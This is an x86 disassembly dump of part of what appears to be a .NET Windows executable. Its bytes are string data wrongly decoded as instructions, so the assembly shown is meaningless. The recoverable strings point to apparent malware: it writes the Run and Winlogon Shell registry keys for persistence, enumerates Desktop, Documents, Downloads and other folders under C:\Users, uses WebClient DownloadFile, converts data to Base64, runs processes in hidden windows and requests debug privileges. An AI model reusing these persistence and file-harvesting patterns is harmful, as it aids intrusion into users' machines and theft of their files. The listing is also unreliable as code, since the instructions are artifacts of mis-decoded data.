  403728:	74 74                	je     0x40379e
  40372a:	72 69                	jb     0x403795
  40372c:	62 75 74             	bound  %esi,0x74(%ebp)
  40372f:	65 00 6e 74          	add    %ch,%gs:0x74(%esi)
  403733:	64 6c                	fs insb (%dx),%es:(%edi)
  403735:	6c                   	insb   (%dx),%es:(%edi)
  403736:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  403739:	6c                   	insb   (%dx),%es:(%edi)
  40373a:	00 41 70             	add    %al,0x70(%ecx)
  40373d:	70 6c                	jo     0x4037ab
  40373f:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  403746:	00 67 65             	add    %ah,0x65(%edi)
  403749:	74 5f                	je     0x4037aa
  40374b:	45                   	inc    %ebp
  40374c:	78 65                	js     0x4037b3
  40374e:	63 75 74             	arpl   %esi,0x74(%ebp)
  403751:	61                   	popa
  403752:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  403756:	61                   	popa
  403757:	74 68                	je     0x4037c1
  403759:	00 53 79             	add    %dl,0x79(%ebx)
  40375c:	73 74                	jae    0x4037d2
  40375e:	65 6d                	gs insl (%dx),%es:(%edi)
  403760:	2e 49                	cs dec %ecx
  403762:	4f                   	dec    %edi
  403763:	00 46 69             	add    %al,0x69(%esi)
  403766:	6c                   	insb   (%dx),%es:(%edi)
  403767:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40376b:	61                   	popa
  40376c:	64 41                	fs inc %ecx
  40376e:	6c                   	insb   (%dx),%es:(%edi)
  40376f:	6c                   	insb   (%dx),%es:(%edi)
  403770:	42                   	inc    %edx
  403771:	79 74                	jns    0x4037e7
  403773:	65 73 00             	gs jae 0x403776
  403776:	4d                   	dec    %ebp
  403777:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40377e:	74 2e                	je     0x4037ae
  403780:	57                   	push   %edi
  403781:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  403788:	67 69 73 74 72 79 00 	imul   $0x52007972,0x74(%bp,%di),%esi
  40378f:	52 
  403790:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  403797:	4b 65 
  403799:	79 00                	jns    0x40379b
  40379b:	43                   	inc    %ebx
  40379c:	75 72                	jne    0x403810
  40379e:	72 65                	jb     0x403805
  4037a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4037a1:	74 55                	je     0x4037f8
  4037a3:	73 65                	jae    0x40380a
  4037a5:	72 00                	jb     0x4037a7
  4037a7:	4f                   	dec    %edi
  4037a8:	70 65                	jo     0x40380f
  4037aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4037ab:	53                   	push   %ebx
  4037ac:	75 62                	jne    0x403810
  4037ae:	4b                   	dec    %ebx
  4037af:	65 79 00             	gs jns 0x4037b2
  4037b2:	53                   	push   %ebx
  4037b3:	74 72                	je     0x403827
  4037b5:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  4037bc:	63 61 74             	arpl   %esp,0x74(%ecx)
  4037bf:	00 53 65             	add    %dl,0x65(%ebx)
  4037c2:	74 56                	je     0x40381a
  4037c4:	61                   	popa
  4037c5:	6c                   	insb   (%dx),%es:(%edi)
  4037c6:	75 65                	jne    0x40382d
  4037c8:	00 49 44             	add    %cl,0x44(%ecx)
  4037cb:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4037d2:	6c                   	insb   (%dx),%es:(%edi)
  4037d3:	65 00 4c 6f 63       	add    %cl,%gs:0x63(%edi,%ebp,2)
  4037d8:	61                   	popa
  4037d9:	6c                   	insb   (%dx),%es:(%edi)
  4037da:	4d                   	dec    %ebp
  4037db:	61                   	popa
  4037dc:	63 68 69             	arpl   %ebp,0x69(%eax)
  4037df:	6e                   	outsb  %ds:(%esi),(%dx)
  4037e0:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  4037e4:	65 61                	gs popa
  4037e6:	74 65                	je     0x40384d
  4037e8:	53                   	push   %ebx
  4037e9:	75 62                	jne    0x40384d
  4037eb:	4b                   	dec    %ebx
  4037ec:	65 79 00             	gs jns 0x4037ef
  4037ef:	52                   	push   %edx
  4037f0:	65 67 69 73 74 72 79 	imul   $0x61567972,%gs:0x74(%bp,%di),%esi
  4037f7:	56 61 
  4037f9:	6c                   	insb   (%dx),%es:(%edi)
  4037fa:	75 65                	jne    0x403861
  4037fc:	4b                   	dec    %ebx
  4037fd:	69 6e 64 00 45 6e 76 	imul   $0x766e4500,0x64(%esi),%ebp
  403804:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
  40380b:	74 00                	je     0x40380d
  40380d:	53                   	push   %ebx
  40380e:	70 65                	jo     0x403875
  403810:	63 69 61             	arpl   %ebp,0x61(%ecx)
  403813:	6c                   	insb   (%dx),%es:(%edi)
  403814:	46                   	inc    %esi
  403815:	6f                   	outsl  %ds:(%esi),(%dx)
  403816:	6c                   	insb   (%dx),%es:(%edi)
  403817:	64 65 72 00          	fs gs jb 0x40381b
  40381b:	47                   	inc    %edi
  40381c:	65 74 46             	gs je  0x403865
  40381f:	6f                   	outsl  %ds:(%esi),(%dx)
  403820:	6c                   	insb   (%dx),%es:(%edi)
  403821:	64 65 72 50          	fs gs jb 0x403875
  403825:	61                   	popa
  403826:	74 68                	je     0x403890
  403828:	00 67 65             	add    %ah,0x65(%edi)
  40382b:	74 5f                	je     0x40388c
  40382d:	55                   	push   %ebp
  40382e:	73 65                	jae    0x403895
  403830:	72 4e                	jb     0x403880
  403832:	61                   	popa
  403833:	6d                   	insl   (%dx),%es:(%edi)
  403834:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  403839:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40383e:	79 00                	jns    0x403840
  403840:	47                   	inc    %edi
  403841:	65 74 46             	gs je  0x40388a
  403844:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  40384b:	74 
  40384c:	44                   	inc    %esp
  40384d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403854:	69 65 73 00 47 65 74 	imul   $0x74654700,0x73(%ebp),%esp
  40385b:	45                   	inc    %ebp
  40385c:	6e                   	outsb  %ds:(%esi),(%dx)
  40385d:	76 69                	jbe    0x4038c8
  40385f:	72 6f                	jb     0x4038d0
  403861:	6e                   	outsb  %ds:(%esi),(%dx)
  403862:	6d                   	insl   (%dx),%es:(%edi)
  403863:	65 6e                	outsb  %gs:(%esi),(%dx)
  403865:	74 56                	je     0x4038bd
  403867:	61                   	popa
  403868:	72 69                	jb     0x4038d3
  40386a:	61                   	popa
  40386b:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40386f:	50                   	push   %eax
  403870:	61                   	popa
  403871:	74 68                	je     0x4038db
  403873:	00 43 6f             	add    %al,0x6f(%ebx)
  403876:	6d                   	insl   (%dx),%es:(%edi)
  403877:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40387a:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  40387e:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  403885:	65 
  403886:	78 74                	js     0x4038fc
  403888:	00 53 79             	add    %dl,0x79(%ebx)
  40388b:	73 74                	jae    0x403901
  40388d:	65 6d                	gs insl (%dx),%es:(%edi)
  40388f:	2e 4e                	cs dec %esi
  403891:	65 74 00             	gs je  0x403894
  403894:	57                   	push   %edi
  403895:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  403899:	69 65 6e 74 00 57 65 	imul   $0x65570074,0x6e(%ebp),%esp
  4038a0:	62 48 65             	bound  %ecx,0x65(%eax)
  4038a3:	61                   	popa
  4038a4:	64 65 72 43          	fs gs jb 0x4038eb
  4038a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a9:	6c                   	insb   (%dx),%es:(%edi)
  4038aa:	6c                   	insb   (%dx),%es:(%edi)
  4038ab:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4038b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4038b1:	00 67 65             	add    %ah,0x65(%edi)
  4038b4:	74 5f                	je     0x403915
  4038b6:	48                   	dec    %eax
  4038b7:	65 61                	gs popa
  4038b9:	64 65 72 73          	fs gs jb 0x403930
  4038bd:	00 53 79             	add    %dl,0x79(%ebx)
  4038c0:	73 74                	jae    0x403936
  4038c2:	65 6d                	gs insl (%dx),%es:(%edi)
  4038c4:	2e 43                	cs inc %ebx
  4038c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4038c7:	6c                   	insb   (%dx),%es:(%edi)
  4038c8:	6c                   	insb   (%dx),%es:(%edi)
  4038c9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4038ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4038cf:	73 2e                	jae    0x4038ff
  4038d1:	53                   	push   %ebx
  4038d2:	70 65                	jo     0x403939
  4038d4:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4038d7:	6c                   	insb   (%dx),%es:(%edi)
  4038d8:	69 7a 65 64 00 4e 61 	imul   $0x614e0064,0x65(%edx),%edi
  4038df:	6d                   	insl   (%dx),%es:(%edi)
  4038e0:	65 56                	gs push %esi
  4038e2:	61                   	popa
  4038e3:	6c                   	insb   (%dx),%es:(%edi)
  4038e4:	75 65                	jne    0x40394b
  4038e6:	43                   	inc    %ebx
  4038e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e8:	6c                   	insb   (%dx),%es:(%edi)
  4038e9:	6c                   	insb   (%dx),%es:(%edi)
  4038ea:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4038ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4038f0:	00 41 64             	add    %al,0x64(%ecx)
  4038f3:	64 00 44 6f 77       	add    %al,%fs:0x77(%edi,%ebp,2)
  4038f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4038f9:	6c                   	insb   (%dx),%es:(%edi)
  4038fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4038fb:	61                   	popa
  4038fc:	64 46                	fs inc %esi
  4038fe:	69 6c 65 00 44 72 69 	imul   $0x76697244,0x0(%ebp,%eiz,2),%ebp
  403905:	76 
  403906:	65 49                	gs dec %ecx
  403908:	6e                   	outsb  %ds:(%esi),(%dx)
  403909:	66 6f                	outsw  %ds:(%esi),(%dx)
  40390b:	00 47 65             	add    %al,0x65(%edi)
  40390e:	74 44                	je     0x403954
  403910:	72 69                	jb     0x40397b
  403912:	76 65                	jbe    0x403979
  403914:	73 00                	jae    0x403916
  403916:	54                   	push   %esp
  403917:	6f                   	outsl  %ds:(%esi),(%dx)
  403918:	53                   	push   %ebx
  403919:	74 72                	je     0x40398d
  40391b:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  403922:	74 72                	je     0x403996
  403924:	6f                   	outsl  %ds:(%esi),(%dx)
  403925:	6c                   	insb   (%dx),%es:(%edi)
  403926:	00 48 69             	add    %cl,0x69(%eax)
  403929:	64 65 00 50 72       	fs add %dl,%gs:0x72(%eax)
  40392e:	6f                   	outsl  %ds:(%esi),(%dx)
  40392f:	63 65 73             	arpl   %esp,0x73(%ebp)
  403932:	73 00                	jae    0x403934
  403934:	45                   	inc    %ebp
  403935:	6e                   	outsb  %ds:(%esi),(%dx)
  403936:	74 65                	je     0x40399d
  403938:	72 44                	jb     0x40397e
  40393a:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40393e:	4d                   	dec    %ebp
  40393f:	6f                   	outsl  %ds:(%esi),(%dx)
  403940:	64 65 00 44 61 74    	fs add %al,%gs:0x74(%ecx,%eiz,2)
  403946:	61                   	popa
  403947:	46                   	inc    %esi
  403948:	6f                   	outsl  %ds:(%esi),(%dx)
  403949:	72 6d                	jb     0x4039b8
  40394b:	61                   	popa
  40394c:	74 73                	je     0x4039c1
  40394e:	00 54 65 78          	add    %dl,0x78(%ebp,%eiz,2)
  403952:	74 00                	je     0x403954
  403954:	43                   	inc    %ebx
  403955:	6f                   	outsl  %ds:(%esi),(%dx)
  403956:	6e                   	outsb  %ds:(%esi),(%dx)
  403957:	76 65                	jbe    0x4039be
  403959:	72 74                	jb     0x4039cf
  40395b:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40395f:	61                   	popa
  403960:	73 65                	jae    0x4039c7
  403962:	36 34 53             	ss xor $0x53,%al
  403965:	74 72                	je     0x4039d9
  403967:	69 6e 67 00 43 6c 69 	imul   $0x696c4300,0x67(%esi),%ebp
  40396e:	70 62                	jo     0x4039d2
  403970:	6f                   	outsl  %ds:(%esi),(%dx)
  403971:	61                   	popa
  403972:	72 64                	jb     0x4039d8
  403974:	00 53 65             	add    %dl,0x65(%ebx)
  403977:	74 44                	je     0x4039bd
  403979:	61                   	popa
  40397a:	74 61                	je     0x4039dd
  40397c:	00 53 65             	add    %dl,0x65(%ebx)
  40397f:	61                   	popa
  403980:	72 63                	jb     0x4039e5
  403982:	68 4f 70 74 69       	push   $0x6974704f
  403987:	6f                   	outsl  %ds:(%esi),(%dx)
  403988:	6e                   	outsb  %ds:(%esi),(%dx)
  403989:	00 57 72             	add    %dl,0x72(%edi)
  40398c:	69 74 65 41 6c 6c 42 	imul   $0x79426c6c,0x41(%ebp,%eiz,2),%esi
  403993:	79 
  403994:	74 65                	je     0x4039fb
  403996:	73 00                	jae    0x403998
  403998:	43                   	inc    %ebx
  403999:	6f                   	outsl  %ds:(%esi),(%dx)
  40399a:	70 79                	jo     0x403a15
  40399c:	00 50 72             	add    %dl,0x72(%eax)
  40399f:	6f                   	outsl  %ds:(%esi),(%dx)
  4039a0:	63 65 73             	arpl   %esp,0x73(%ebp)
  4039a3:	73 53                	jae    0x4039f8
  4039a5:	74 61                	je     0x403a08
  4039a7:	72 74                	jb     0x403a1d
  4039a9:	49                   	dec    %ecx
  4039aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ab:	66 6f                	outsw  %ds:(%esi),(%dx)
  4039ad:	00 73 65             	add    %dh,0x65(%ebx)
  4039b0:	74 5f                	je     0x403a11
  4039b2:	46                   	inc    %esi
  4039b3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4039ba:	00 
  4039bb:	73 65                	jae    0x403a22
  4039bd:	74 5f                	je     0x403a1e
  4039bf:	41                   	inc    %ecx
  4039c0:	72 67                	jb     0x403a29
  4039c2:	75 6d                	jne    0x403a31
  4039c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4039c6:	74 73                	je     0x403a3b
  4039c8:	00 50 72             	add    %dl,0x72(%eax)
  4039cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4039cc:	63 65 73             	arpl   %esp,0x73(%ebp)
  4039cf:	73 57                	jae    0x403a28
  4039d1:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4039d8:	79 6c                	jns    0x403a46
  4039da:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4039de:	74 5f                	je     0x403a3f
  4039e0:	57                   	push   %edi
  4039e1:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4039e8:	79 6c                	jns    0x403a56
  4039ea:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4039ee:	74 5f                	je     0x403a4f
  4039f0:	53                   	push   %ebx
  4039f1:	74 61                	je     0x403a54
  4039f3:	72 74                	jb     0x403a69
  4039f5:	49                   	dec    %ecx
  4039f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4039f7:	66 6f                	outsw  %ds:(%esi),(%dx)
  4039f9:	00 53 74             	add    %dl,0x74(%ebx)
  4039fc:	61                   	popa
  4039fd:	72 74                	jb     0x403a73
  4039ff:	00 43 6f             	add    %al,0x6f(%ebx)
  403a02:	6e                   	outsb  %ds:(%esi),(%dx)
  403a03:	74 61                	je     0x403a66
  403a05:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  403a0c:	74 72                	je     0x403a80
  403a0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0f:	6c                   	insb   (%dx),%es:(%edi)
  403a10:	00 41 75             	add    %al,0x75(%ecx)
  403a13:	74 6f                	je     0x403a84
  403a15:	53                   	push   %ebx
  403a16:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  403a19:	65 4d                	gs dec %ebp
  403a1b:	6f                   	outsl  %ds:(%esi),(%dx)
  403a1c:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  403a21:	74 5f                	je     0x403a82
  403a23:	41                   	inc    %ecx
  403a24:	75 74                	jne    0x403a9a
  403a26:	6f                   	outsl  %ds:(%esi),(%dx)
  403a27:	53                   	push   %ebx
  403a28:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  403a2b:	65 4d                	gs dec %ebp
  403a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a2e:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  403a33:	74 5f                	je     0x403a94
  403a35:	54                   	push   %esp
  403a36:	65 78 74             	gs js  0x403aad
  403a39:	00 73 65             	add    %dh,0x65(%ebx)
  403a3c:	74 5f                	je     0x403a9d
  403a3e:	4e                   	dec    %esi
  403a3f:	61                   	popa
  403a40:	6d                   	insl   (%dx),%es:(%edi)
  403a41:	65 00 53 54          	add    %dl,%gs:0x54(%ebx)
  403a45:	41                   	inc    %ecx
  403a46:	54                   	push   %esp
  403a47:	68 72 65 61 64       	push   $0x64616572
  403a4c:	41                   	inc    %ecx
  403a4d:	74 74                	je     0x403ac3
  403a4f:	72 69                	jb     0x403aba
  403a51:	62 75 74             	bound  %esi,0x74(%ebp)
  403a54:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  403a58:	61                   	popa
  403a59:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  403a5d:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  403a64:	79 6c                	jns    0x403ad2
  403a66:	65 73 00             	gs jae 0x403a69
  403a69:	53                   	push   %ebx
  403a6a:	65 74 43             	gs je  0x403ab0
  403a6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403a6e:	6d                   	insl   (%dx),%es:(%edi)
  403a6f:	70 61                	jo     0x403ad2
  403a71:	74 69                	je     0x403adc
  403a73:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  403a77:	65 78 74             	gs js  0x403aee
  403a7a:	52                   	push   %edx
  403a7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  403a7d:	64 65 72 69          	fs gs jb 0x403aea
  403a81:	6e                   	outsb  %ds:(%esi),(%dx)
  403a82:	67 44                	addr16 inc %esp
  403a84:	65 66 61             	gs popaw
  403a87:	75 6c                	jne    0x403af5
  403a89:	74 00                	je     0x403a8b
  403a8b:	52                   	push   %edx
  403a8c:	75 6e                	jne    0x403afc
  403a8e:	00 00                	add    %al,(%eax)
  403a90:	00 5b 53             	add    %bl,0x53(%ebx)
  403a93:	00 4f 00             	add    %cl,0x0(%edi)
  403a96:	46                   	inc    %esi
  403a97:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  403a9b:	00 41 00             	add    %al,0x0(%ecx)
  403a9e:	52                   	push   %edx
  403a9f:	00 45 00             	add    %al,0x0(%ebp)
  403aa2:	5c                   	pop    %esp
  403aa3:	00 4d 00             	add    %cl,0x0(%ebp)
  403aa6:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  403aac:	6f                   	outsl  %ds:(%esi),(%dx)
  403aad:	00 73 00             	add    %dh,0x0(%ebx)
  403ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab1:	00 66 00             	add    %ah,0x0(%esi)
  403ab4:	74 00                	je     0x403ab6
  403ab6:	5c                   	pop    %esp
  403ab7:	00 57 00             	add    %dl,0x0(%edi)
  403aba:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  403ac0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ac1:	00 77 00             	add    %dh,0x0(%edi)
  403ac4:	73 00                	jae    0x403ac6
  403ac6:	5c                   	pop    %esp
  403ac7:	00 43 00             	add    %al,0x0(%ebx)
  403aca:	75 00                	jne    0x403acc
  403acc:	72 00                	jb     0x403ace
  403ace:	72 00                	jb     0x403ad0
  403ad0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403ad4:	74 00                	je     0x403ad6
  403ad6:	56                   	push   %esi
  403ad7:	00 65 00             	add    %ah,0x0(%ebp)
  403ada:	72 00                	jb     0x403adc
  403adc:	73 00                	jae    0x403ade
  403ade:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403ae4:	5c                   	pop    %esp
  403ae5:	00 52 00             	add    %dl,0x0(%edx)
  403ae8:	75 00                	jne    0x403aea
  403aea:	6e                   	outsb  %ds:(%esi),(%dx)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	15 4d 00 79 00       	adc    $0x79004d,%eax
  403af2:	20 00                	and    %al,(%eax)
  403af4:	50                   	push   %eax
  403af5:	00 72 00             	add    %dh,0x0(%edx)
  403af8:	6f                   	outsl  %ds:(%esi),(%dx)
  403af9:	00 67 00             	add    %ah,0x0(%edi)
  403afc:	72 00                	jb     0x403afe
  403afe:	61                   	popa
  403aff:	00 6d 00             	add    %ch,0x0(%ebp)
  403b02:	00 03                	add    %al,(%ebx)
  403b04:	5c                   	pop    %esp
  403b05:	00 00                	add    %al,(%eax)
  403b07:	6b 53 00 4f          	imul   $0x4f,0x0(%ebx),%edx
  403b0b:	00 46 00             	add    %al,0x0(%esi)
  403b0e:	54                   	push   %esp
  403b0f:	00 57 00             	add    %dl,0x0(%edi)
  403b12:	41                   	inc    %ecx
  403b13:	00 52 00             	add    %dl,0x0(%edx)
  403b16:	45                   	inc    %ebp
  403b17:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  403b1b:	00 69 00             	add    %ch,0x0(%ecx)
  403b1e:	63 00                	arpl   %eax,(%eax)
  403b20:	72 00                	jb     0x403b22
  403b22:	6f                   	outsl  %ds:(%esi),(%dx)
  403b23:	00 73 00             	add    %dh,0x0(%ebx)
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	00 66 00             	add    %ah,0x0(%esi)
  403b2a:	74 00                	je     0x403b2c
  403b2c:	5c                   	pop    %esp
  403b2d:	00 57 00             	add    %dl,0x0(%edi)
  403b30:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  403b36:	6f                   	outsl  %ds:(%esi),(%dx)
  403b37:	00 77 00             	add    %dh,0x0(%edi)
  403b3a:	73 00                	jae    0x403b3c
  403b3c:	20 00                	and    %al,(%eax)
  403b3e:	4e                   	dec    %esi
  403b3f:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  403b43:	00 43 00             	add    %al,0x0(%ebx)
  403b46:	75 00                	jne    0x403b48
  403b48:	72 00                	jb     0x403b4a
  403b4a:	72 00                	jb     0x403b4c
  403b4c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403b50:	74 00                	je     0x403b52
  403b52:	56                   	push   %esi
  403b53:	00 65 00             	add    %ah,0x0(%ebp)
  403b56:	72 00                	jb     0x403b58
  403b58:	73 00                	jae    0x403b5a
  403b5a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403b60:	5c                   	pop    %esp
  403b61:	00 57 00             	add    %dl,0x0(%edi)
  403b64:	69 00 6e 00 6c 00    	imul   $0x6c006e,(%eax),%eax
  403b6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6b:	00 67 00             	add    %ah,0x0(%edi)
  403b6e:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6f:	00 6e 00             	add    %ch,0x0(%esi)
  403b72:	00 0b                	add    %cl,(%ebx)
  403b74:	53                   	push   %ebx
  403b75:	00 68 00             	add    %ch,0x0(%eax)
  403b78:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	13 43 00             	adc    0x0(%ebx),%eax
  403b82:	3a 00                	cmp    (%eax),%al
  403b84:	5c                   	pop    %esp
  403b85:	00 55 00             	add    %dl,0x0(%ebp)
  403b88:	73 00                	jae    0x403b8a
  403b8a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403b8e:	73 00                	jae    0x403b90
  403b90:	5c                   	pop    %esp
  403b91:	00 00                	add    %al,(%eax)
  403b93:	11 5c 00 44          	adc    %ebx,0x44(%eax,%eax,1)
  403b97:	00 65 00             	add    %ah,0x0(%ebp)
  403b9a:	73 00                	jae    0x403b9c
  403b9c:	6b 00 74             	imul   $0x74,(%eax),%eax
  403b9f:	00 6f 00             	add    %ch,0x0(%edi)
  403ba2:	70 00                	jo     0x403ba4
  403ba4:	00 0d 5c 00 4c 00    	add    %cl,0x4c005c
  403baa:	69 00 6e 00 6b 00    	imul   $0x6b006e,(%eax),%eax
  403bb0:	73 00                	jae    0x403bb2
  403bb2:	00 13                	add    %dl,(%ebx)
  403bb4:	5c                   	pop    %esp
  403bb5:	00 43 00             	add    %al,0x0(%ebx)
  403bb8:	6f                   	outsl  %ds:(%esi),(%dx)
  403bb9:	00 6e 00             	add    %ch,0x0(%esi)
  403bbc:	74 00                	je     0x403bbe
  403bbe:	61                   	popa
  403bbf:	00 63 00             	add    %ah,0x0(%ebx)
  403bc2:	74 00                	je     0x403bc4
  403bc4:	73 00                	jae    0x403bc6
  403bc6:	00 15 5c 00 44 00    	add    %dl,0x44005c
  403bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bcd:	00 63 00             	add    %ah,0x0(%ebx)
  403bd0:	75 00                	jne    0x403bd2
  403bd2:	6d                   	insl   (%dx),%es:(%edi)
  403bd3:	00 65 00             	add    %ah,0x0(%ebp)
  403bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  403bd7:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  403bdb:	00 00                	add    %al,(%eax)
  403bdd:	15 5c 00 44 00       	adc    $0x44005c,%eax
  403be2:	6f                   	outsl  %ds:(%esi),(%dx)
  403be3:	00 77 00             	add    %dh,0x0(%edi)
  403be6:	6e                   	outsb  %ds:(%esi),(%dx)
  403be7:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  403beb:	00 61 00             	add    %ah,0x0(%ecx)
  403bee:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  403bf2:	00 13                	add    %dl,(%ebx)
  403bf4:	5c                   	pop    %esp
  403bf5:	00 50 00             	add    %dl,0x0(%eax)
  403bf8:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  403bfe:	75 00                	jne    0x403c00
  403c00:	72 00                	jb     0x403c02
  403c02:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403c06:	00 0d 5c 00 4d 00    	add    %cl,0x4d005c
  403c0c:	75 00                	jne    0x403c0e
  403c0e:	73 00                	jae    0x403c10
  403c10:	69 00 63 00 00 13    	imul   $0x13000063,(%eax),%eax
  403c16:	5c                   	pop    %esp
  403c17:	00 4f 00             	add    %cl,0x0(%edi)
  403c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  403c1b:	00 65 00             	add    %ah,0x0(%ebp)
  403c1e:	44                   	inc    %esp
  403c1f:	00 72 00             	add    %dh,0x0(%edx)
  403c22:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  403c28:	00 19                	add    %bl,(%ecx)
  403c2a:	5c                   	pop    %esp
  403c2b:	00 53 00             	add    %dl,0x0(%ebx)
  403c2e:	61                   	popa
  403c2f:	00 76 00             	add    %dh,0x0(%esi)
  403c32:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  403c37:	00 47 00             	add    %al,0x0(%edi)
  403c3a:	61                   	popa
  403c3b:	00 6d 00             	add    %ch,0x0(%ebp)
  403c3e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403c42:	00 15 5c 00 46 00    	add    %dl,0x46005c
  403c48:	61                   	popa
  403c49:	00 76 00             	add    %dh,0x0(%esi)
  403c4c:	6f                   	outsl  %ds:(%esi),(%dx)
  403c4d:	00 72 00             	add    %dh,0x0(%edx)
  403c50:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  403c56:	73 00                	jae    0x403c58
  403c58:	00 13                	add    %dl,(%ebx)
  403c5a:	5c                   	pop    %esp
  403c5b:	00 53 00             	add    %dl,0x0(%ebx)
  403c5e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  403c62:	72 00                	jb     0x403c64
  403c64:	63 00                	arpl   %eax,(%eax)
  403c66:	68 00 65 00 73       	push   $0x73006500
  403c6b:	00 00                	add    %al,(%eax)
  403c6d:	0f 5c 00             	subps  (%eax),%xmm0
  403c70:	56                   	push   %esi
  403c71:	00 69 00             	add    %ch,0x0(%ecx)
  403c74:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  403c78:	6f                   	outsl  %ds:(%esi),(%dx)
  403c79:	00 73 00             	add    %dh,0x0(%ebx)
  403c7c:	00 17                	add    %dl,(%edi)
  403c7e:	55                   	push   %ebp
  403c7f:	00 53 00             	add    %dl,0x0(%ebx)
  403c82:	45                   	inc    %ebp
  403c83:	00 52 00             	add    %dl,0x0(%edx)
  403c86:	50                   	push   %eax
